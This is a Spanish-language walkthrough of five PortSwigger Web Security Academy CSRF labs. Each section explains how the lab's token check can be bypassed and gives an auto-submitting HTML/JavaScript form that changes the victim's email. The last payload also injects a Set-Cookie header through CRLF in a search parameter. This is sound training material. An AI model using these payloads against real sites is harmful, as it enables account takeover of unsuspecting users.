# Cross-Site-Request-Forgery (Labs)

### CSRF vulnerability with no defenses

Nuestro objetivo es conseguir provocar un cambio de e-mail de la víctima, para ello disponemos de un servidor para nuestro exploit y un usuario creado en la web.

En este caso concreto lo que debemos hacer es ver primero cómo hacer dicho cambio al e-mail, para ello nos logueamos y en mi cuenta procuramos cambiar el e-mail interceptando con Burpsuite y comprobando la petición.

No tiene mucho misterio, es una petición tipo POST en la que únicamente tenemos un campo, así que podemos generar un Payload en nuestro servidor de exploit.

```
<form method="POST" action="https://aca11fed1e1eceffc0756c74001700bf.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="asd@asd.com">
</form>
<img src="" onerror=peticion()>
<script>
function peticion() {
    document.forms[0].submit();
}
</script>
```

### CSRF where token validation depends on request method

En este caso hacemos igual que antes pero vemos que piden un CSRF para realizar la petición, así que podemos probar qué ocurriría si en vez de por POST hacemos la petición por GET y sin CSRF, y parece que funciona, así que nuestro Payload es:

```
<form method="GET" action="https://acda1f231e24960bc01b1d4e0078008f.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="asd@asd.com">
</form>
<img src="" onerror=peticion()>
<script>
function peticion() {
    document.forms[0].submit();
}
</script>
```

### CSRF where token validation depends on token being present

Me comí más la cabeza para este de lo que realmente era necesario, si eliminar el parámetro CSRF completamente sigue funcionando el cambio, así que es el mismo Payload que el primer ejercicio:

```
<form method="POST" action="https://ac191fc11e4c4b62c01318b7009600d4.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="asd@asd.com">
</form>
<img src="" onerror=peticion()>
<script>
function peticion() {
    document.forms[0].submit();
}
</script>
```

### CSRF where token is not tied to user session

En este caso si nos ponemos a hacer varias pruebas vemos que el CSRF creado no depende del usuario, es decir, si se crea un CSRF específico para mi puede utilizarse desde otra cuenta para cambiar su email. Pero únicamente se puede utilizar una vez cada CSRF, por lo que únicamente tenemos que añadir un campo con un CSRF no utilizado que podemos sacar del mismo código fuente desde el navegador.

```
<form method="POST" action="https://ac231fa71f26ebfdc05b093900f40029.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="asd@asd.com">
     <input type="hidden" name="csrf" value="WiXuGUi3ZgtgHASYQVbhNktdX7e2h0Np">
</form>
<img src="" onerror=peticion()>
<script>
function peticion() {
    document.forms[0].submit();
}
</script>
```

En un ataque real podría el atacante estar generando continuamente esos CSRF e inyectarlos en el código de su sitio web malicioso, en este caso lo hacemos de forma manual.

### CSRF where token is tied to non-session cookie

Con toda la sinceridad del mundo tuve que mirar la solución, probé a hacer muchas cosas pero es cierto que me cerré en banda únicamente a la sección de cambio de mail, y fue un gran fallo que no debéis cometer.¡ Mirad todo!

Al final resulta que cuando buscas algo en el cuadro de búsqueda de la web, añade una cookie al Header, así que igual que cuando escapas de un XSS o un SQLI podemos crear nuestra propia Cookie en la cabecera que será enviada.

A esto le sumamos que la Cookie CSRF y el campo CSRF se pueden intercambiar entre usuarios tenemos el Payload preparado.

```
<form method="POST" action="https://acbe1fc11fc91156c07b15580061007c.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="asd@asd.com">
     <input type="hidden" name="csrf" value="Z0KXhR8NO4Q1LVVOtPmCpXDdosayyc4V">
</form>
<img src="https://acbe1fc11fc91156c07b15580061007c.web-security-academy.net/?search=asd%0d%0aSet-Cookie:%20csrfKey=iayAf3yJT4NE6odynia0dtHmG1ALiuI7" onerror=peticion()>
<script>
function peticion() {
    document.forms[0].submit();
}
</script>
```

